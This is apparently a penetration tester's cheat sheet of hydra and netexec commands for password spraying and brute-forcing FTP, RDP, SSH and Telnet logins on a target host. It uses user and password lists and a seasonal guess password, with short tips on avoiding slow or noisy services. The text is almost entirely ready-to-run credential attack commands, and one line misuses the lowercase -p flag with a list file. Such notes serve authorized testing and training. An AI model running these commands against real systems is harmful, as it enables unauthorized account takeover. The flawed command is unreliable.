
Spray to test passwords
```bash
hydra -L users.txt -p 'Spring2026!' -t 4 -W 3 -o spray_pass1.txt ftp://$ip
```
f to exit on hit
```bash
hydra -L users.txt -p pass.txt -f -t 4 -W 3 -o spray_pass1.txt ftp://$ip
```

Null/same-as-user/reversed logins (cheap first pass)
```bash
hydra -L users.txt -P pass.txt -e nsr -t 4 ftp://$ip
```

RDP is slow to spray — prefer SMB/WinRM for cred validation, then use found creds here.
Spray with netexec (lightweight check)
```bash
nxc rdp $ip -u users.txt -p 'Spring2026!' --continue-on-success
```
Brute force with hydra
```bash
hydra -L users.txt -P pass.txt rdp://$ip
```

SSH brute is slow and noisy — spray only, and only after other methods fail.
Spray a single password across users
```bash
hydra -L users.txt -p 'Spring2026!' -t 4 ssh://$ip
```
Brute force with a password list
```bash
hydra -L users.txt -P pass.txt -t 4 ssh://$ip
```

Telnet
Brute force with hydra
```bash
hydra -L users.txt -P pass.txt telnet://$ip
```